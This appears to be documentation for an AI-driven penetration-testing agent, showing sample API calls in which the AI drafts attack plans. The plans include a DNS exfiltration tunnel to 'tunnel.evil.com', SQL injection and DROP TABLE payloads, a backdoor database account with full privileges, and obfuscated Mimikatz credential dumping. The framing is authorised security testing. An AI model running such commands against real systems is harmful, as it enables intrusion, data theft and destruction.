# 🎮 **USER-CONTROLLED AI ATTACK AGENT**

## ✅ **YES, USERS CAN REQUEST SPECIFIC ATTACKS!**

The AI Attack Agent supports:
1. **Specific MITRE Techniques** (e.g., "Execute T1082")
2. **Attack Types by Name** (e.g., "DNS Tunneling")
3. **Custom Scenarios** (e.g., "Test our database security")
4. **AI-Generated Plans** (e.g., "Create ransomware simulation")

---

## 🎯 **1. REQUEST SPECIFIC MITRE TECHNIQUE**

### **Example: User wants T1082 (System Information Discovery)**
```javascript
// REQUEST
POST /api/ai-attack/execute-technique
{
  "technique": "T1082",
  "targets": ["agent-001", "agent-002"],  // Optional, AI can select
  "message": "Please execute T1082 system discovery on Windows servers"
}

// RESPONSE
{
  "success": true,
  "workflowId": "wf-123",
  "technique": {
    "id": "T1082",
    "name": "System Information Discovery",
    "description": "Gathering system configuration and hardware info"
  },
  "plan": {
    "commands": [
      "systeminfo",
      "wmic os get Caption,Version,BuildNumber",
      "Get-ComputerInfo | Select-Object *"
    ],
    "targets": ["DESKTOP-ABC", "SERVER-001"],
    "estimatedTime": "5 minutes"
  },
  "status": "awaiting_approval",
  "message": "Attack plan ready. Please review and approve."
}
```

### **Approve and Execute**
```javascript
POST /api/ai-attack/approve/{workflowId}
{
  "confirmed": true
}

// Attack executes with real-time updates
```

---

## 🌐 **2. REQUEST ATTACK BY NAME**

### **Example: User wants DNS Tunneling**
```javascript
// REQUEST
POST /api/ai-attack/named-attack
{
  "attackName": "DNS Tunneling",
  "objective": "Test DNS-based data exfiltration detection"
}

// RESPONSE
{
  "workflowId": "wf-456",
  "attackPlan": {
    "name": "DNS Tunneling Simulation",
    "description": "Simulating data exfiltration via DNS queries",
    "phases": [
      {
        "phase": 1,
        "action": "Setup DNS tunnel client",
        "commands": ["Install-Module DNSTunnel", "New-DNSChannel -Server tunnel.evil.com"]
      },
      {
        "phase": 2,
        "action": "Encode and transmit data",
        "commands": ["Invoke-DNSExfil -Data $sensitiveData -Chunk 63"]
      },
      {
        "phase": 3,
        "action": "Verify detection",
        "commands": ["Get-DNSClientCache | Where {$_.Name -like '*tunnel*'}"]
      }
    ],
    "detectionTest": "Checking if SIEM detected unusual DNS patterns",
    "safetyNote": "Simulation only - no actual data exfiltrated"
  },
  "status": "awaiting_approval"
}
```

---

## 🤖 **3. AI-GENERATED CUSTOM SCENARIOS**

### **Example: User describes what they want**
```javascript
// REQUEST - Natural language request
POST /api/ai-attack/custom-scenario
{
  "request": "Can you create an attack scenario that tests our database security? Focus on SQL injection and privilege escalation.",
  "constraints": {
    "maxDuration": "30 minutes",
    "avoidDisruption": true,
    "targetSystems": ["database-servers"]
  }
}

// RESPONSE - AI creates complete scenario
{
  "workflowId": "wf-789",
  "generatedScenario": {
    "name": "Database Security Assessment",
    "description": "AI-generated scenario targeting SQL injection and privilege escalation",
    "attackChain": [
      {
        "technique": "T1190",
        "name": "Exploit Public-Facing Application",
        "implementation": "SQL injection attempts on web forms",
        "commands": [
          "sqlmap -u 'http://app/login' --batch --dump",
          "'; DROP TABLE test; --",
          "UNION SELECT username, password FROM users"
        ]
      },
      {
        "technique": "T1078",
        "name": "Valid Accounts",
        "implementation": "Use discovered credentials",
        "commands": [
          "mysql -u discovered_user -p'password' -h db_server",
          "SHOW GRANTS;",
          "SELECT * FROM mysql.user;"
        ]
      },
      {
        "technique": "T1068",
        "name": "Privilege Escalation",
        "implementation": "Escalate database privileges",
        "commands": [
          "CREATE USER 'backdoor'@'%' IDENTIFIED BY 'pass';",
          "GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%';",
          "UDF privilege escalation attempt"
        ]
      }
    ],
    "expectedOutcomes": [
      "Test SQL injection prevention",
      "Verify privilege separation",
      "Check audit logging",
      "Validate input sanitization"
    ],
    "rollbackPlan": "All changes will be reverted after test"
  },
  "requiresApproval": true
}
```

---

## 💬 **4. CHAT-BASED ATTACK REQUESTS**

### **Natural Language Interface**
```javascript
// REQUEST - Via chat interface
POST /api/v1/chat
{
  "message": "I want to test if our endpoints can detect mimikatz. Can you run a credential dumping attack?",
  "context": "security_testing"
}

// RESPONSE - AI understands and creates plan
{
  "response": "I'll create a Mimikatz credential dumping test for you. Here's the plan:",
  "attackPlan": {
    "name": "Credential Dumping Detection Test",
    "techniques": ["T1003.001 - LSASS Memory"],
    "tools": ["Mimikatz", "ProcDump"],
    "targets": "Selected Windows endpoints",
    "phases": [
      "1. Deploy Mimikatz (obfuscated)",
      "2. Attempt LSASS dump",
      "3. Extract credentials",
      "4. Verify detection alerts"
    ]
  },
  "workflowId": "wf-321",
  "actionRequired": "Please review and approve this attack plan",
  "buttons": [
    {"action": "approve", "label": "Execute Attack"},
    {"action": "modify", "label": "Modify Plan"},
    {"action": "cancel", "label": "Cancel"}
  ]
}
```

---

## 🎮 **5. INTERACTIVE ATTACK CONTROL**

### **Modify Attack Parameters**
```javascript
// User can modify any aspect before approval
POST /api/ai-attack/modify/{workflowId}
{
  "modifications": {
    "targets": ["only-test-servers"],  // Change targets
    "techniques": ["T1003", "T1055"],  // Change techniques
    "intensity": "low",                 // Reduce intensity
    "timing": "after-hours",           // Change timing
    "excludeCommands": ["rm -rf"]      // Exclude dangerous commands
  }
}
```

### **Real-time Control During Execution**
```javascript
// Pause attack
POST /api/ai-attack/control/{workflowId}
{"action": "pause"}

// Resume attack
POST /api/ai-attack/control/{workflowId}
{"action": "resume"}

// Stop attack
POST /api/ai-attack/control/{workflowId}
{"action": "stop"}

// Skip current phase
POST /api/ai-attack/control/{workflowId}
{"action": "skip_phase"}
```

---

## 📚 **6. ATTACK LIBRARY & TEMPLATES**

### **Get Available Attack Templates**
```javascript
GET /api/ai-attack/library

// RESPONSE
{
  "categories": {
    "reconnaissance": [
      {"id": "T1595", "name": "Active Scanning"},
      {"id": "T1592", "name": "Gather Victim Host Information"}
    ],
    "initial_access": [
      {"id": "T1566", "name": "Phishing"},
      {"id": "T1190", "name": "Exploit Public-Facing Application"}
    ],
    "persistence": [
      {"id": "T1547", "name": "Boot or Logon Autostart"},
      {"id": "T1053", "name": "Scheduled Task/Job"}
    ],
    "credential_access": [
      {"id": "T1003", "name": "OS Credential Dumping"},
      {"id": "T1555", "name": "Credentials from Password Stores"}
    ],
    "lateral_movement": [
      {"id": "T1021", "name": "Remote Services"},
      {"id": "T1570", "name": "Lateral Tool Transfer"}
    ],
    "exfiltration": [
      {"id": "T1041", "name": "Exfiltration Over C2 Channel"},
      {"id": "T1048", "name": "Exfiltration Over Alternative Protocol"}
    ]
  },
  "customScenarios": [
    "Ransomware Simulation",
    "APT Campaign",
    "Insider Threat",
    "Supply Chain Attack",
    "Zero-Day Simulation"
  ]
}
```

---

## 🔍 **7. ATTACK QUERY & LEARNING**

### **Ask AI About Attacks**
```javascript
// REQUEST
POST /api/ai-attack/query
{
  "question": "What's the best way to test lateral movement detection?"
}

// RESPONSE
{
  "answer": "For testing lateral movement detection, I recommend a phased approach:",
  "recommendations": [
    {
      "technique": "T1021.001",
      "name": "Remote Desktop Protocol",
      "reason": "Common in enterprises, often allowed"
    },
    {
      "technique": "T1021.002", 
      "name": "SMB/Windows Admin Shares",
      "reason": "Mimics real attacker behavior"
    },
    {
      "technique": "T1021.006",
      "name": "Windows Remote Management",
      "reason": "Often overlooked by defenders"
    }
  ],
  "suggestedScenario": {
    "name": "Lateral Movement Detection Test",
    "duration": "45 minutes",
    "phases": ["Initial compromise", "Credential theft", "Lateral spread", "Persistence"]
  },
  "createPlan": true  // Option to create full plan
}
```

---

## 🎯 **8. EXAMPLES OF USER REQUESTS**

### **Specific Technique**
```
"Execute T1082 on all Windows servers"
"Run T1003 credential dumping"
"Test T1055 process injection"
```

### **Named Attacks**
```
"Perform DNS tunneling attack"
"Execute a ransomware simulation"
"Run a phishing campaign test"
"Test SQL injection vulnerabilities"
```

### **Custom Scenarios**
```
"Create an attack that tests our cloud security"
"Simulate an insider threat scenario"
"Test if we can detect data exfiltration"
"Check our defense against privilege escalation"
```

### **Natural Language**
```
"Can you try to steal credentials from our domain controller?"
"I want to see if our EDR detects process injection"
"Test whether someone can move laterally in our network"
"Show me how an attacker would compromise our web server"
```

---

## ✅ **SAFETY FEATURES**

1. **Always Requires Approval**
   - No attack executes without explicit approval
   - User can review all commands before execution

2. **Modification Allowed**
   - Users can change targets
   - Users can exclude techniques
   - Users can adjust intensity

3. **Real-time Control**
   - Pause/Resume/Stop anytime
   - Skip phases if needed
   - Emergency stop button

4. **Audit Trail**
   - Every request logged
   - All approvals recorded
   - Complete execution history

5. **Safety Constraints**
   ```javascript
   {
     "prohibited": ["rm -rf /", "format c:"],
     "requireApproval": ["data_exfiltration", "ransomware"],
     "excludeTargets": ["production-critical-*"]
   }
   ```

---

## 🚀 **IMPLEMENTATION STATUS**

✅ **Already Implemented:**
- LangGraph workflow for attack planning
- AI-powered scenario generation
- Human approval workflow
- MITRE ATT&CK mapping
- Natural language understanding
- Real-time execution control

✅ **Ready to Use:**
- `/api/ai-attack/start` - Start workflow
- `/api/ai-attack/scenarios/{id}` - Get scenarios
- `/api/ai-attack/approve/{id}` - Approve execution
- `/api/ai-attack/modify/{id}` - Modify plans
- `/api/v1/chat` - Natural language interface

---

## 💡 **KEY TAKEAWAY**

**YES, users have COMPLETE CONTROL over the AI Attack Agent:**
- ✅ Request specific MITRE techniques (T1082, T1003, etc.)
- ✅ Request attacks by name (DNS Tunneling, Phishing, etc.)
- ✅ Create custom scenarios via natural language
- ✅ Modify any aspect before execution
- ✅ Real-time control during execution
- ✅ Always requires human approval

The AI Attack Agent is your **interactive penetration testing assistant** that understands both technical specifications and natural language requests! 🎯
